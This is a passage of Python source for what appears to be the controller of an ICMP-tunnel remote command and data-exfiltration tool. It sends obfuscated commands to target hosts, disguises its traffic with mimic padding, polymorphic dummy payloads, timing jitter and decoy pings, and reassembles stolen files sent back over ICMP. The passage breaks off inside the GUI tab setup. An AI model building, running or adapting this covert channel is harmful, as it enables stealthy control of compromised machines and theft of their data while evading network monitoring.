import socket
import struct
import select
import sys
import threading
import time
import argparse
import random
import tkinter as tk
from tkinter import scrolledtext, ttk
from tkinter import Menu, filedialog
import datetime
import hashlib
import lzma
import base64
import os
import math
import atexit

is_echo = False

ICMP_ID = 0x1111       
DEFAULT_SHIFT_VALUE = 1
DEFAULT_RAILFENCE_RAILS = 4
DEFAULT_BIT_RAILFENCE_RAILS = 7        # Set at >=2
HANDSHAKE_PREFIX = b"SYNC:"
ACK_PREFIX = b"ACK:"
PROBE_COMMAND = b"probe"  
FRAGMENTATION_THRESHOLD = 48
FRAG_SIZE = 48
FRAG_START = b"FRAG_START:"
FRAG_PREFIX = b"FRAG:"
PADDING_MIN = 1
PADDING_MAX = 5
REDUNDANCY_FACTOR = 0.1  
FRAG_TIMEOUT = 60  

seq_lock = threading.Lock()

def suppress_icmp(family):
    ignore_file = '/proc/sys/net/ipv4/icmp_echo_ignore_all' if family == socket.AF_INET else '/proc/sys/net/ipv6/icmp/echo_ignore_all'
    with open(ignore_file, 'w') as f:
        f.write('1\n')
    return ignore_file

def unsuppress_icmp(ignore_file):
    with open(ignore_file, 'w') as f:
        f.write('0\n')

def calculate_entropy(data):
    if not data:
        return 0.0
    freq = [0] * 256
    for byte in data:
        freq[byte] += 1
    total = len(data)
    ent = 0.0
    for f in freq:
        if f > 0:
            p = f / total
            ent -= p * math.log2(p)
    return ent

def checksum(source_string):
    sum_val = 0
    count_to = (len(source_string) // 2) * 2
    count = 0
    while count < count_to:
        this_val = (source_string[count] << 8) | source_string[count + 1]
        sum_val += this_val
        sum_val &= 0xffffffff
        count += 2
    if count_to < len(source_string):
        sum_val += (source_string[-1] << 8)
        sum_val &= 0xffffffff
    sum_val = (sum_val >> 16) + (sum_val & 0xffff)
    sum_val += sum_val >> 16
    answer = ~sum_val
    answer &= 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def checksum_v6(src, dst, data):
    src_bin = socket.inet_pton(socket.AF_INET6, src)
    dst_bin = socket.inet_pton(socket.AF_INET6, dst)
    length = struct.pack('!I', len(data))
    next_hdr = b'\x00\x00\x00\x3A'
    pseudo = src_bin + dst_bin + length + next_hdr
    full = pseudo + data
    return checksum(full)

def railfence_encrypt(data, rails):
    fence = [[] for _ in range(rails)]
    direction = 1
    row = 0
    for char in data:
        fence[row].append(char)
        row += direction
        if row == rails - 1 or row == 0:
            direction = -direction
    return b''.join(bytes(row) for row in fence)

def railfence_decrypt(data, rails):
    data_len = len(data)
    fence = [[] for _ in range(rails)]
    direction = 1
    row = 0
    for _ in range(data_len):
        fence[row].append(None)
        row += direction
        if row == rails - 1 or row == 0:
            direction = -direction
    idx = 0
    for r in range(rails):
        for c in range(len(fence[r])):
            fence[r][c] = data[idx]
            idx += 1
    result = []
    direction = 1
    row = 0
    for _ in range(data_len):
        result.append(fence[row].pop(0))
        row += direction
        if row == rails - 1 or row == 0:
            direction = -direction
    return b''.join(bytes([x]) for x in result)

def shift_encrypt(data, shift):
    return bytes((b + shift) % 256 for b in data)

def shift_decrypt(data, shift):
    return bytes((b - shift) % 256 for b in data)

def bit_railfence_encrypt(data, rails):
    bit_data = ''.join(f'{byte:08b}' for byte in data)
    fence = [[] for _ in range(rails)]
    direction = 1
    row = 0
    for bit in bit_data:
        fence[row].append(bit)
        row += direction
        if row == rails - 1 or row == 0:
            direction = -direction
    encrypted_bits = ''.join(''.join(row) for row in fence)
    return bytes(int(encrypted_bits[i:i+8], 2) for i in range(0, len(encrypted_bits), 8))

def bit_railfence_decrypt(data, rails):
    bit_data = ''.join(f'{byte:08b}' for byte in data)
    data_len = len(bit_data)
    fence = [[] for _ in range(rails)]
    direction = 1
    row = 0
    for _ in range(data_len):
        fence[row].append(None)
        row += direction
        if row == rails - 1 or row == 0:
            direction = -direction
    idx = 0
    for r in range(rails):
        for c in range(len(fence[r])):
            fence[r][c] = bit_data[idx]
            idx += 1
    result = []
    direction = 1
    row = 0
    for _ in range(data_len):
        result.append(fence[row].pop(0))
        row += direction
        if row == rails - 1 or row == 0:
            direction = -direction
    decrypted_bits = ''.join(result)
    return bytes(int(decrypted_bits[i:i+8], 2) for i in range(0, len(decrypted_bits), 8))

def generate_substitution_table(seed):
    random.seed(seed)
    table = list(range(256))
    random.shuffle(table)
    return table

def substitution_encrypt(data, table):
    return bytes(table[b] for b in data)

def substitution_decrypt(data, table):
    inverse_table = [0] * 256
    for i, v in enumerate(table):
        inverse_table[v] = i
    return bytes(inverse_table[b] for b in data)

def reverse_data(data):
    return data[::-1]

def generate_linux_mimic_padding(length, seed):
    random.seed(seed)
    padding = bytearray()
    while len(padding) < length:
        r = random.random()
        if r < 0.45:
            run_len = random.randint(6, 24)
            padding.extend(b'\x00' * run_len)
        elif r < 0.70:
            start = random.randint(0x08, 0x50)
            run_len = random.randint(8, 32)
            padding.extend(bytes(range(start, start + run_len)))
        elif r < 0.85:
            patterns = [
                b'0123456789' * 6,
                b'abcdefghijklmnopqrstuvwabcdefghi' * 2,
                struct.pack('!I', random.randint(0, 0xffffffff)) * random.randint(3, 6),
            ]
            pat = random.choice(patterns)
            padding.extend(pat[:random.randint(12, 36)])
        else:
            chunk = random.randbytes(random.randint(4, 12))
            chunk = bytes(b & 0x7F if random.random() < 0.8 else b for b in chunk)
            padding.extend(chunk)
    return bytes(padding[:length])

def layered_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None):
    pre_redun_len = len(data)
    redundancy_len = int(pre_redun_len * REDUNDANCY_FACTOR)
    redundancy = data[:redundancy_len]
    data += b'\x00' * (redundancy_len // 2) + redundancy
    post_redun_len = len(data)
    header = struct.pack('!II', pre_redun_len, post_redun_len)
    data = header + data
    pad_len = random.randint(PADDING_MIN, PADDING_MAX)
    random.seed(padding_seed if padding_seed is not None else 0)
    padding = bytes(random.randint(0, 255) for _ in range(pad_len))
    data += padding
    layer_funcs = {
        'reverse': reverse_data,
        'railfence': lambda d: railfence_encrypt(d, railfence_rails),
        'shift': lambda d: shift_encrypt(d, shift),
        'bit_railfence': lambda d: bit_railfence_encrypt(d, bit_rails),
        'sub': lambda d: substitution_encrypt(d, sub_table) if sub_table else d
    }
    for layer in layers or ['reverse', 'railfence', 'shift', 'bit_railfence', 'sub']:
        data = layer_funcs[layer](data)
    minor_funcs = {
        'flip': lambda d: bytes(b ^ (random.randint(0, 1) if random.random() < 0.1 else 0) for b in d),
        'xor': lambda d: bytes(b ^ (padding_seed % 256) for b in d),  
        'noise': lambda d: d + random.randbytes(random.randint(1, 3)),
        'rotate': lambda d: d[-1:] + d[:-1]
    }
    for op in selected_ops or []:
        random.seed(padding_seed if padding_seed is not None else 0 + sum(map(ord, op)))
        if random.random() < 0.5:
            data = minor_funcs[op](data)
    data = struct.pack('!H', len(data)) + data
    mimic_seed = padding_seed ^ len(data) if padding_seed is not None else 0
    pad_len = random.randint(16, 48) if len(data) > 100 else random.randint(8, 24)
    mimic = generate_linux_mimic_padding(pad_len, mimic_seed)
    data += mimic
    return data

def layered_decrypt(data, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None, padding_seed=None):
    if len(data) < 2:
        return b''
    original_len = struct.unpack('!H', data[:2])[0]
    if len(data) < 2 + original_len:
        return b''
    data = data[2:2 + original_len]
    minor_inverse_funcs = {
        'flip': lambda d: bytes(b ^ (random.randint(0, 1) if random.random() < 0.1 else 0) for b in d),
        'xor': lambda d: bytes(b ^ (padding_seed % 256) for b in d),
        'noise': lambda d: d[:-random.randint(1, 3)] if len(d) > 3 else d,
        'rotate': lambda d: d[1:] + d[:1]
    }
    for op in reversed(selected_ops or []):
        random.seed(padding_seed if padding_seed is not None else 0 + sum(map(ord, op)))
        if random.random() < 0.5:
            data = minor_inverse_funcs[op](data)
    inverse_funcs = {
        'reverse': reverse_data,
        'railfence': lambda d: railfence_decrypt(d, railfence_rails),
        'shift': lambda d: shift_decrypt(d, shift),
        'bit_railfence': lambda d: bit_railfence_decrypt(d, bit_rails),
        'sub': lambda d: substitution_decrypt(d, sub_table) if sub_table else d
    }
    for layer in reversed(layers or ['reverse', 'railfence', 'shift', 'bit_railfence', 'sub']):
        data = inverse_funcs[layer](data)
    if len(data) < 8:
        return b''
    pre_redun_len, post_redun_len = struct.unpack('!II', data[:8])
    data = data[8:8 + post_redun_len]
    data = data[:pre_redun_len]
    return data

def light_encrypt(data, padding_seed=None, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None):
    layer_funcs = {
        'reverse': reverse_data,
        'railfence': lambda d: railfence_encrypt(d, railfence_rails),
        'shift': lambda d: shift_encrypt(d, shift),
        'bit_railfence': lambda d: bit_railfence_encrypt(d, bit_rails),
        'sub': lambda d: substitution_encrypt(d, sub_table) if sub_table else d
    }
    for layer in layers or ['reverse', 'railfence', 'shift', 'bit_railfence', 'sub']:
        data = layer_funcs[layer](data)
    minor_funcs = {
        'flip': lambda d: bytes(b ^ (random.randint(0, 1) if random.random() < 0.1 else 0) for b in d),
        'xor': lambda d: bytes(b ^ (padding_seed % 256) for b in d),
        'rotate': lambda d: d[-1:] + d[:-1]
    }
    selected = [op for op in selected_ops or [] if op != 'noise']
    for op in selected:
        random.seed(padding_seed if padding_seed is not None else 0 + sum(map(ord, op)))
        if random.random() < 0.5:
            data = minor_funcs[op](data)
    data = struct.pack('!H', len(data)) + data
    mimic_seed = padding_seed ^ len(data) if padding_seed is not None else 0
    pad_len = random.randint(16, 48) if len(data) > 100 else random.randint(8, 24)
    mimic = generate_linux_mimic_padding(pad_len, mimic_seed)
    data += mimic
    return data

def light_decrypt(data, sub_table=None, shift=DEFAULT_SHIFT_VALUE, railfence_rails=DEFAULT_RAILFENCE_RAILS, bit_rails=DEFAULT_BIT_RAILFENCE_RAILS, layers=None, selected_ops=None, padding_seed=None):
    if len(data) < 2:
        return b''
    original_len = struct.unpack('!H', data[:2])[0]
    if len(data) < 2 + original_len:
        return b''
    data = data[2:2 + original_len]
    selected = [op for op in selected_ops or [] if op != 'noise']
    minor_inverse_funcs = {
        'flip': lambda d: bytes(b ^ (random.randint(0, 1) if random.random() < 0.1 else 0) for b in d),
        'xor': lambda d: bytes(b ^ (padding_seed % 256) for b in d),
        'rotate': lambda d: d[1:] + d[:1]
    }
    for op in reversed(selected):
        random.seed(padding_seed if padding_seed is not None else 0 + sum(map(ord, op)))
        if random.random() < 0.5:
            data = minor_inverse_funcs[op](data)
    inverse_funcs = {
        'reverse': reverse_data,
        'railfence': lambda d: railfence_decrypt(d, railfence_rails),
        'shift': lambda d: shift_decrypt(d, shift),
        'bit_railfence': lambda d: bit_railfence_decrypt(d, bit_rails),
        'sub': lambda d: substitution_decrypt(d, sub_table) if sub_table else d
    }
    for layer in reversed(layers or ['reverse', 'railfence', 'shift', 'bit_railfence', 'sub']):
        data = inverse_funcs[layer](data)
    return data

def ms_since_midnight():
    now = datetime.datetime.now().time()
    return now.hour * 3600000 + now.minute * 60000 + now.second * 1000 + now.microsecond // 1000

extra_bytes = {
    8: 0, 0: 0,
    13: 12, 14: 12,
    17: 4, 18: 4,
    15: 0, 16: 0,
    10: 4, 9: 8,
    128: 0, 129: 0,
    133: 4, 134: 12,
    37: 0, 38: 0,
    135: 20, 136: 20,
    253: 0, 254: 0,
    130: 20, 131: 20,
    35: 0, 36: 2,
    30: 16,  
    40: 4,   
    42: 6,  
    43: 8   
}

def _get_base_dummy(icmp_type, icmp_id, icmp_sequence):
    if icmp_type in [0x11, 0x16]:
        return b''
    if icmp_type in [37, 38]:
        return b''
    if icmp_type in [13, 14]:
        ms = ms_since_midnight()
        orig = ms + random.randint(-5000, 5000)
        recv = orig + random.randint(0, 10000)
        trans = recv + random.randint(0, 1000)
        return struct.pack("!III", orig, recv, trans)
    elif icmp_type in [17, 18]:
        if icmp_type == 17:
            return b'\x00\x00\x00\x00'
        else:
            masks = [b'\xff\xff\xff\x00', b'\xff\xff\x00\x00', b'\xff\x00\x00\x00']
            return random.choice(masks)
    elif icmp_type == 10:
        return b'\x00\x00\x00\x00'
    elif icmp_type == 9:
        lifetime = random.randint(0, 65535).to_bytes(2, 'big')
        addr = b'\xc0\xa8' + random.randbytes(1) + random.randbytes(1)
        return b'\x01\x02' + lifetime + addr
    elif icmp_type in [128, 129]:
        return b''
    elif icmp_type == 133:
        return b'\x00\x00\x00\x00'
    elif icmp_type == 134:
        hop = random.choice([64, 255])
        flags = 0
        lifetime = random.randint(0, 65535)
        reachable = 0
        retrans = 0
        return struct.pack('!BBHII', hop, flags, lifetime, reachable, retrans)
    elif icmp_type in [135, 136]:
        if icmp_type == 135:
            res = b'\x00\x00\x00\x00'
        else:
            flags = random.choice([0, 1<<31, 1<<30, 1<<29, 3<<29])
            res = struct.pack('!I', flags)
        return res + random.randbytes(16)
    elif icmp_type in [130, 131]:
        if icmp_type == 130:
            return struct.pack("!HH", random.randint(100, 1000), 0) + random.randbytes(16)
        else:
            return struct.pack("!HH", 0, 1) + random.randbytes(16)
    elif icmp_type in [35, 36]:
        if icmp_type == 35:
            return b''
        else:
            return struct.pack('!BB', random.randint(0, 128), 0)
    elif icmp_type == 30:  
        id_num = random.randint(0, 65535)
        unused = 0
        out_hop = random.randint(1, 255)
        ret_hop = random.randint(1, 255)
        out_speed = random.randint(1000000, 1000000000)  
        out_mtu = random.randint(1500, 9000)
        return struct.pack('!HHHHI', id_num, unused, out_hop, ret_hop, out_speed) + struct.pack('!I', out_mtu)
    elif icmp_type == 40:  
        reserved = random.randbytes(4)
        return reserved
    elif icmp_type in [42, 43]:  
        flags = random.randint(0, 3)  
        if icmp_type == 42:
            return struct.pack('!HHH', icmp_id, icmp_sequence, flags)
        else:
            status = 0  
            return struct.pack('!HHHH', icmp_id, icmp_sequence, flags, status)
    else:
        return b''

def get_dummy_payload(icmp_type, icmp_id, seq, poly_seed=None, mutation_count=3):
    if poly_seed is not None:
        random.seed(poly_seed + seq)
        mode = random.randint(0, mutation_count - 1)
    else:
        mode = 0
    base_dummy = _get_base_dummy(icmp_type, icmp_id, seq)
    if mode == 0:
        return base_dummy
    elif mode == 1:
        return base_dummy[::-1]
    elif mode == 2:
        return bytes((b ^ (seq & 0xFF)) for b in base_dummy)
    elif mode == 3:
        insert = random.randbytes(2)
        return insert + base_dummy
    elif mode == 4:
        return base_dummy + b'\x00' * random.randint(1, 4)
    return base_dummy

def derive_prefixes(seed):
    hash_obj = hashlib.sha256(seed.encode())
    hash_digest = hash_obj.digest()
    cmd_prefix = hash_digest[:4]
    out_prefix = hash_digest[4:8]
    padding_seed = int.from_bytes(hash_digest[8:16], 'big')
    sub_seed = int.from_bytes(hash_digest[16:24], 'big')
    shift_value = hash_digest[24] % 128 + 1
    railfence_rails = (hash_digest[25] % 4) + 2
    bit_rails = (hash_digest[26] % 8) + 4
    sub_table = generate_substitution_table(sub_seed)
    poly_seed = int.from_bytes(hash_digest[27:31], 'big')
    mutation_count = (hash_digest[31] % 3) + 3
    delay_mode = ['uniform', 'exponential', 'gamma'][hash_digest[28] % 3]
    delay_min = (hash_digest[29] % 5) + 1
    delay_max = delay_min + (hash_digest[30] % 5) + 1
    layers = ['reverse', 'railfence', 'shift', 'bit_railfence', 'sub']
    random.seed(int.from_bytes(hash_digest[24:28], 'big'))
    random.shuffle(layers)
    minor_ops = ['flip', 'xor', 'noise', 'rotate']
    random.seed(int.from_bytes(hash_digest[29:33], 'big'))
    selected_ops = random.sample(minor_ops, k=random.randint(2, 3))
    return cmd_prefix, out_prefix, padding_seed, sub_table, shift_value, railfence_rails, bit_rails, poly_seed, mutation_count, delay_mode, delay_min, delay_max, layers, selected_ops

def get_local_ip(target, family):
    s = socket.socket(family, socket.SOCK_DGRAM)
    try:
        s.connect((target, 1))
        return s.getsockname()[0]
    except Exception:
        return '::1' if family == socket.AF_INET6 else '127.0.0.1'
    finally:
        s.close()

def compute_delay(delay_mode, delay_min, delay_max, rtt=None):
    if is_echo:
        return 1.0
    base = {
        'uniform': random.uniform(1.0, 1.8),
        'exponential': random.expovariate(1 / 1.4) + 0.8,
        'gamma': random.gammavariate(2, 0.4) + 1.0
    }[delay_mode]
    if rtt:
        base *= (1 + (rtt / 1000))
    base = min(max(base, 1.0), 1.8)
    jitter = base * random.uniform(-0.1, 0.1)
    return min(max(base + jitter, 1.0), 1.8)

def send_packet(target_ip, req_type, icmp_id, icmp_sequence, payload, family, proto, poly_seed=None, mutation_count=3):
    icmp_code = 0
    icmp_checksum = 0
    dummy = get_dummy_payload(req_type, icmp_id, icmp_sequence, poly_seed, mutation_count)
    full_payload = dummy + payload

    source_ip = get_local_ip(target_ip, family)
    header = struct.pack("!BBHHH", req_type, icmp_code, icmp_checksum, icmp_id, icmp_sequence)
    if family == socket.AF_INET6:
        icmp_checksum = checksum_v6(source_ip, target_ip, header[0:2] + b'\x00\x00' + header[4:] + full_payload)
    else:
        icmp_checksum = checksum(header + full_payload)
    header = struct.pack("!BBHHH", req_type, icmp_code, socket.htons(icmp_checksum), icmp_id, icmp_sequence)
    packet = header + full_payload

    with socket.socket(family, socket.SOCK_RAW, proto) as sock:
        sock.sendto(packet, (target_ip, 0) if family == socket.AF_INET else (target_ip, 0, 0, 0))

def send_handshake(target_ip, req_type, icmp_id, seq_queue, family, proto):
    seed = str(random.randint(100000, 999999))  
    payload = HANDSHAKE_PREFIX + seed.encode()
    encrypted_payload = layered_encrypt(payload)
    with seq_lock:
        icmp_sequence = seq_queue[target_ip]
        seq_queue[target_ip] = (seq_queue[target_ip] + 1) % 65536
    send_packet(target_ip, req_type, icmp_id, icmp_sequence, encrypted_payload, family, proto)
    return seed

def send_dummy(target_ip, req_type, icmp_id, seq_queue, family, proto, poly_seed=None, mutation_count=3):
    with seq_lock:
        icmp_sequence = seq_queue[target_ip]
        seq_queue[target_ip] = (seq_queue[target_ip] + 1) % 65536
    dummy_payload = get_dummy_payload(req_type, icmp_id, icmp_sequence, poly_seed, mutation_count)
    send_packet(target_ip, req_type, icmp_id, icmp_sequence, dummy_payload, family, proto, poly_seed, mutation_count)

def send_command(target_ip, command, req_type, icmp_id, seq_queue, cmd_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, is_file=False, progress_callback=None, cancel_event=None, poly_seed=None, mutation_count=3, delay_mode=None, delay_min=1, delay_max=3, layers=None, selected_ops=None):
    actual_payload = cmd_prefix + command.encode('utf-8')

    force_frag = is_file
    pause_timer = time.time() if force_frag else None
    if force_frag or len(actual_payload) > FRAGMENTATION_THRESHOLD:
        data = actual_payload[len(cmd_prefix):]
        data = lzma.compress(data) if is_file else data
        encrypted_data = layered_encrypt(data, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
        overall_hash = hashlib.sha256(encrypted_data).digest()
        frags = []
        i = 0
        while i < len(encrypted_data):
            frag_size = FRAG_SIZE if is_echo else FRAG_SIZE + random.randint(-10, 10)
            frag_size = max(1, min(frag_size, len(encrypted_data) - i))
            frags.append(encrypted_data[i:i+frag_size])
            i += frag_size
        total_frags = len(frags)
        frag_id = random.randbytes(4)
        total_packets = 1 + total_frags
        sent = 0

        init_payload = cmd_prefix + FRAG_START + struct.pack('!4sI32s', frag_id, total_frags, overall_hash)
        encrypted_init = light_encrypt(init_payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
        with seq_lock:
            icmp_sequence = seq_queue[target_ip]
            seq_queue[target_ip] = (seq_queue[target_ip] + 1) % 65536
        send_packet(target_ip, req_type, icmp_id, icmp_sequence, encrypted_init, family, proto, poly_seed, mutation_count)
        sent += 1
        if progress_callback:
            progress_callback(sent, total_packets)
        time.sleep(compute_delay(delay_mode, delay_min, delay_max))
        if cancel_event and cancel_event.is_set():
            return "Command canceled"

        frags_with_num = list(enumerate(frags))
        random.seed(padding_seed + len(data))
        random.shuffle(frags_with_num)

        for num, frag_data in frags_with_num:
            if cancel_event and cancel_event.is_set():
                return "Command canceled"
            frag_payload = cmd_prefix + FRAG_PREFIX + struct.pack('!4sI', frag_id, num) + frag_data
            encrypted_frag = light_encrypt(frag_payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
            with seq_lock:
                icmp_sequence = seq_queue[target_ip]
                seq_queue[target_ip] = (seq_queue[target_ip] + 1) % 65536
            send_packet(target_ip, req_type, icmp_id, icmp_sequence, encrypted_frag, family, proto, poly_seed, mutation_count)
            sent += 1
            if progress_callback:
                progress_callback(sent, total_packets)
            time.sleep(compute_delay(delay_mode, delay_min, delay_max))
            if force_frag and time.time() - pause_timer > 900:
                pause_dur = random.uniform(60, 180)
                time.sleep(pause_dur)
                pause_timer = time.time()
    else:
        encrypted_payload = layered_encrypt(actual_payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
        with seq_lock:
            icmp_sequence = seq_queue[target_ip]
            seq_queue[target_ip] = (seq_queue[target_ip] + 1) % 65536
        send_packet(target_ip, req_type, icmp_id, icmp_sequence, encrypted_payload, family, proto, poly_seed, mutation_count)

def send_probe(target_ip, req_type, icmp_id, icmp_sequence, cmd_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, poly_seed=None, mutation_count=3, layers=None, selected_ops=None):
    payload = cmd_prefix + PROBE_COMMAND
    encrypted_payload = layered_encrypt(payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
    send_packet(target_ip, req_type, icmp_id, icmp_sequence, encrypted_payload, family, proto, poly_seed, mutation_count)

def check_probe_response(target_ip, rep_type, icmp_id, probe_seq, out_prefix, sub_table, shift, railfence_rails, bit_rails, family, local_ip, proto, poly_seed=None, mutation_count=3, layers=None, selected_ops=None, padding_seed=None):
    start_time = time.time()
    with socket.socket(family, socket.SOCK_RAW, proto) as sock:
        while time.time() - start_time < 4:
            ready = select.select([sock], [], [], 1)
            if ready[0]:
                data, addr = sock.recvfrom(2048)
                if addr[0] != target_ip:
                    continue
                ihl = (data[0] & 0xF) * 4 if family == socket.AF_INET else 40
                icmp_header = data[ihl:ihl+8]
                icmp_type, _, _, pkt_id, pkt_seq = struct.unpack("!BBHHH", icmp_header)
                if icmp_type == rep_type and pkt_id == icmp_id and pkt_seq == probe_seq:
                    skip_bytes = len(get_dummy_payload(rep_type, icmp_id, pkt_seq, poly_seed, mutation_count))
                    encrypted_payload = data[ihl+8+skip_bytes:]
                    payload = layered_decrypt(encrypted_payload, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops, padding_seed=padding_seed)
                    if payload == out_prefix + b"ALIVE":
                        return True
    return False

def send_noise(target_ip, req_type, icmp_id, seq_queue, level, stop_event, family, proto, local_ip, poly_seed=None, mutation_count=3):
    rates = {"Low": 1, "Medium": 10, "High": 50}
    rate = rates.get(level, 1)
    delay = 1.0 / rate
    is_echo_req = req_type in [8, 128]
    if is_echo_req:
        while not stop_event.is_set():
            send_dummy(target_ip, req_type, icmp_id, seq_queue, family, proto, poly_seed, mutation_count)
            time.sleep(delay)
    else:
        echo_type = 8 if family == socket.AF_INET else 128
        sock = socket.socket(family, socket.SOCK_RAW, proto)
        while not stop_event.is_set():
            icmp_id_rand = random.randint(1, 65535)
            icmp_seq_rand = random.randint(1, 65535)
            payload = random.randbytes(random.randint(32, 64))
            header = struct.pack("!BBHHH", echo_type, 0, 0, icmp_id_rand, icmp_seq_rand)
            if family == socket.AF_INET6:
                chksum = checksum_v6(local_ip, target_ip, header + payload)
            else:
                chksum = checksum(header + payload)
            header = struct.pack("!BBHHH", echo_type, 0, chksum, icmp_id_rand, icmp_seq_rand)
            packet = header + payload
            try:
                sock.sendto(packet, (target_ip, 0) if family == socket.AF_INET else (target_ip, 0, 0, 0))
            except Exception as e:
                print(f"Error sending noise ping: {e}")
                break
            time.sleep(delay)

def receive_output(target_ip, rep_type, icmp_id, output_text, root, out_prefix, sub_table, shift, railfence_rails, bit_rails, family, local_ip, proto, exfil_status_label, exfil_cancel_event, poly_seed=None, mutation_count=3, layers=None, selected_ops=None, padding_seed=None, req_type=None, seq_queue=None, cmd_prefix=None, delay_mode=None, delay_min=None, delay_max=None):
    frag_buffers = {}

    with socket.socket(family, socket.SOCK_RAW, proto) as sock:
        while True:
            ready = select.select([sock], [], [], 1)
            if ready[0]:
                data, addr = sock.recvfrom(2048)
                if addr[0] != target_ip:
                    continue
                ihl = (data[0] & 0xF) * 4 if family == socket.AF_INET else 40
                if len(data) < ihl + 8:
                    continue
                icmp_header = data[ihl:ihl+8]
                icmp_type, _, _, pkt_id, pkt_seq = struct.unpack("!BBHHH", icmp_header)
                if icmp_type == rep_type and pkt_id == icmp_id:
                    skip_bytes = len(get_dummy_payload(rep_type, icmp_id, pkt_seq, poly_seed, mutation_count))
                    encrypted_payload = data[ihl+8+skip_bytes:]
                    payload = layered_decrypt(encrypted_payload, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops, padding_seed=padding_seed)
                    if not payload.startswith(out_prefix):
                        payload = light_decrypt(encrypted_payload, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops, padding_seed=padding_seed)
                    if payload.startswith(out_prefix):
                        rest = payload[len(out_prefix):]
                        if rest.startswith(FRAG_START):
                            if len(rest) < len(FRAG_START) + 40:
                                continue
                            frag_id, total_frags, overall_hash = struct.unpack('!4sI32s', rest[len(FRAG_START):len(FRAG_START)+40])
                            frag_buffers[frag_id] = {'frags': {}, 'total': total_frags, 'hash': overall_hash, 'ts': time.time()}
                            time.sleep(compute_delay(delay_mode, delay_min, delay_max))
                            send_dummy(target_ip, req_type, icmp_id, seq_queue, family, proto, poly_seed, mutation_count)
                        elif rest.startswith(FRAG_PREFIX):
                            if len(rest) < len(FRAG_PREFIX) + 8:
                                continue
                            frag_id, num = struct.unpack('!4sI', rest[len(FRAG_PREFIX):len(FRAG_PREFIX)+8])
                            frag_data = rest[len(FRAG_PREFIX)+8:]
                            if frag_id in frag_buffers:
                                buf = frag_buffers[frag_id]
                                if time.time() - buf['ts'] > FRAG_TIMEOUT:
                                    del frag_buffers[frag_id]
                                    continue
                                if exfil_cancel_event.is_set():
                                    root.after(0, lambda: output_text.insert(tk.END, "Exfil canceled\n\n"))
                                    continue
                                buf['frags'][num] = frag_data
                                buf['ts'] = time.time()
                                received = len(buf['frags'])
                                total = buf['total']
                                if exfil_status_label:
                                    perc = (received / total) * 100 if total > 0 else 0
                                    root.after(0, lambda: exfil_status_label.config(text="{:.1f}% ({}/{}) packets".format(perc, received, total)))
                                if received < total:
                                    time.sleep(compute_delay(delay_mode, delay_min, delay_max))
                                    send_dummy(target_ip, req_type, icmp_id, seq_queue, family, proto, poly_seed, mutation_count)
                                if received == total:
                                    assembled_encrypted = b''.join(buf['frags'].get(i, b'') for i in range(total))
                                    if hashlib.sha256(assembled_encrypted).digest() == buf['hash']:
                                        assembled = layered_decrypt(assembled_encrypted, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops, padding_seed=padding_seed)
                                        try:
                                            assembled = lzma.decompress(assembled)
                                        except lzma.LZMAError:
                                            pass
                                        output = assembled.decode('utf-8', errors='ignore').strip()
                                        if output.startswith("EXFIL_START:"):
                                            parts = output[len("EXFIL_START:"):].split(":", 1)
                                            filename, encoded_data = parts[0], parts[1]
                                            compressed_data = base64.b64decode(encoded_data)
                                            try:
                                                file_data = lzma.decompress(compressed_data)
                                            except lzma.LZMAError:
                                                file_data = compressed_data
                                            def do_save():
                                                save_path = filedialog.asksaveasfilename(defaultextension=".bin", initialfile=filename)
                                                if save_path:
                                                    with open(save_path, 'wb') as f:
                                                        f.write(file_data)
                                                    output_text.insert(tk.END, f"Exfiled file saved to {save_path}\n\n")
                                            root.after(0, do_save)
                                        elif output.startswith("UPLOAD_SUCCESS:"):
                                            root.after(0, lambda: output_text.insert(tk.END, f"Upload success: {output[len('UPLOAD_SUCCESS:'):]}\n\n"))
                                        elif output.startswith("UPLOAD_ERROR:"):
                                            root.after(0, lambda: output_text.insert(tk.END, f"Upload error: {output[len('UPLOAD_ERROR:'):]}\n\n"))
                                        elif output.startswith("EXFIL_ERROR:"):
                                            root.after(0, lambda: output_text.insert(tk.END, f"Exfil error: {output[len('EXFIL_ERROR:'):]}\n\n"))
                                        else:
                                            root.after(0, lambda: output_text.insert(tk.END, f"Output from {addr[0]}:\n{output}\n\n"))
                                        if exfil_status_label:
                                            root.after(0, lambda: exfil_status_label.config(text=""))
                                    del frag_buffers[frag_id]
                        else:
                            output = rest.decode('utf-8', errors='ignore').strip()
                            if output == "ALIVE":
                                continue
                            root.after(0, lambda: output_text.insert(tk.END, f"Output from {addr[0]}:\n{output}\n\n"))
            for fid in list(frag_buffers.keys()):
                if time.time() - frag_buffers[fid]['ts'] > FRAG_TIMEOUT:
                    del frag_buffers[fid]

def create_tab(notebook, target_ip, req_type, rep_type, icmp_id, seq_queue, family, proto, local_ip, cmd_prefixes, out_prefixes, padding_seeds, sub_tables, shifts, railfence_railss, bit_railss, root, poly_seeds, mutation_counts, delay_modes, delay_mins, delay_maxs, layerss, selected_opss):
    tab = tk.Frame(notebook, bg='black')
    notebook.add(tab, text=target_ip)

    cmd_prefix = cmd_prefixes[target_ip]
    out_prefix = out_prefixes[target_ip]
    padding_seed = padding_seeds[target_ip]
    sub_table = sub_tables[target_ip]
    shift = shifts[target_ip]
    railfence_rails = railfence_railss[target_ip]
    bit_rails = bit_railss[target_ip]
    poly_seed = poly_seeds[target_ip]
